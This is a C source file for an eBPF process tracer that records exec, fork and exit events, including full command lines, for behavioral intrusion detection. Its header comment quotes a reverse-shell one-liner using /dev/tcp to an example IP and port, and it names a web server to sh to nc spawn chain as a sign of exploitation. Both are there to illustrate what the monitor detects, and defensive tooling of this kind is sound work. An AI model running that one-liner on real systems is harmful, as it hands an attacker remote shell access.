/*
 * process_monitor.c - BehaveGuard process-lifecycle tracer (eBPF / BCC)
 *
 * Hooks : syscalls:sys_enter_execve   - exec (executable path + argv)
 *         sched:sched_process_fork    - fork (parent/child PIDs)
 *         sched:sched_process_exit    - exit (exit code)
 * Emits : struct process_event_t (560 bytes) -> ring buffer `process_events`
 *
 * Defense rationale: the process tree is the backbone of behavioral detection.
 * Capturing argv at execve is what separates a benign `bash -lc 'ls'` from a
 * reverse shell `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`; fork edges reconstruct
 * the spawn chain (web server -> sh -> nc) that signals exploitation; exit
 * codes flag crashing/looping payloads.
 *
 * The 560-byte event exceeds the BPF stack limit, so it is assembled in a
 * per-CPU scratch map. argv is read with a bounded (#pragma unroll) loop -
 * unbounded argv walking is rejected by the verifier.
 *
 * struct process_event_t MUST match ProcessEventRaw in event_types.py
 * (verified sizeof == 560).
 */
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

#ifndef OWN_PID
#define OWN_PID 0
#endif

#define EXE_PATH_LEN 256
#define CMDLINE_LEN  256
#define MAX_ARGS     16     /* upper bound on argv entries scanned */

/* process_event_t.action values */
#define ACT_EXEC 0
#define ACT_FORK 1
#define ACT_EXIT 2

struct process_event_t {
    u64 timestamp_ns;
    u32 pid;
    u32 ppid;
    u32 uid;
    s32 exit_code;
    u32 action;
    char comm[TASK_COMM_LEN];
    char exe_path[EXE_PATH_LEN];
    char cmdline[CMDLINE_LEN];
};

BPF_RINGBUF_OUTPUT(process_events, 256);
BPF_PERCPU_ARRAY(proc_scratch, struct process_event_t, 1);

/* real_parent->tgid of the current task. */
static __always_inline u32 current_ppid(void) {
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    struct task_struct *parent = NULL;
    bpf_probe_read_kernel(&parent, sizeof(parent), &task->real_parent);
    u32 ppid = 0;
    if (parent)
        bpf_probe_read_kernel(&ppid, sizeof(ppid), &parent->tgid);
    return ppid;
}

static __always_inline struct process_event_t *proc_evt_init(u32 action) {
    u32 zero = 0;
    struct process_event_t *evt = proc_scratch.lookup(&zero);
    if (!evt)
        return NULL;
    __builtin_memset(evt, 0, sizeof(*evt));
    evt->timestamp_ns = bpf_ktime_get_ns();
    evt->uid = bpf_get_current_uid_gid() & 0xffffffff;
    evt->action = action;
    return evt;
}

TRACEPOINT_PROBE(syscalls, sys_enter_execve) {
    u64 id = bpf_get_current_pid_tgid();
    u32 tgid = id >> 32;
    if (tgid == OWN_PID || tgid == 0)
        return 0;

    struct process_event_t *evt = proc_evt_init(ACT_EXEC);
    if (!evt)
        return 0;

    evt->pid = tgid;
    evt->ppid = current_ppid();
    bpf_get_current_comm(&evt->comm, sizeof(evt->comm));

    /* Target executable path. */
    bpf_probe_read_user_str(&evt->exe_path, sizeof(evt->exe_path), (void *)args->filename);

    /* Flatten argv into a single space-separated cmdline (bounded). */
    const char *const *argv = (const char *const *)(args->argv);
    int off = 0;
    #pragma unroll
    for (int i = 0; i < MAX_ARGS; i++) {
        const char *argp = NULL;
        bpf_probe_read_user(&argp, sizeof(argp), &argv[i]);
        if (!argp)
            break;
        if (off >= CMDLINE_LEN - 1)
            break;
        /* Mask keeps the verifier convinced the offset stays in-bounds. */
        off &= (CMDLINE_LEN - 1);
        int n = bpf_probe_read_user_str(&evt->cmdline[off], CMDLINE_LEN - off, argp);
        if (n <= 0)
            break;
        off += n;                       /* n counts the trailing NUL */
        if (off >= 1 && off <= CMDLINE_LEN - 1)
            evt->cmdline[off - 1] = ' '; /* NUL -> space between args */
    }
    if (off >= 1 && off <= CMDLINE_LEN - 1)
        evt->cmdline[off - 1] = '\0';    /* terminate, dropping trailing space */

    process_events.ringbuf_output(evt, sizeof(*evt), 0);
    return 0;
}

TRACEPOINT_PROBE(sched, sched_process_fork) {
    u32 parent_tgid = args->parent_pid;
    if (parent_tgid == OWN_PID || parent_tgid == 0)
        return 0;

    struct process_event_t *evt = proc_evt_init(ACT_FORK);
    if (!evt)
        return 0;

    evt->pid = args->child_pid;
    evt->ppid = parent_tgid;
    bpf_probe_read_kernel_str(&evt->comm, sizeof(evt->comm), args->child_comm);

    process_events.ringbuf_output(evt, sizeof(*evt), 0);
    return 0;
}

TRACEPOINT_PROBE(sched, sched_process_exit) {
    u64 id = bpf_get_current_pid_tgid();
    u32 tgid = id >> 32;
    if (tgid == OWN_PID || tgid == 0)
        return 0;

    struct process_event_t *evt = proc_evt_init(ACT_EXIT);
    if (!evt)
        return 0;

    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    int exit_code = 0;
    bpf_probe_read_kernel(&exit_code, sizeof(exit_code), &task->exit_code);

    evt->pid = tgid;
    evt->ppid = current_ppid();
    evt->exit_code = (exit_code >> 8) & 0xff;   /* WEXITSTATUS */
    bpf_get_current_comm(&evt->comm, sizeof(evt->comm));

    process_events.ringbuf_output(evt, sizeof(*evt), 0);
    return 0;
}
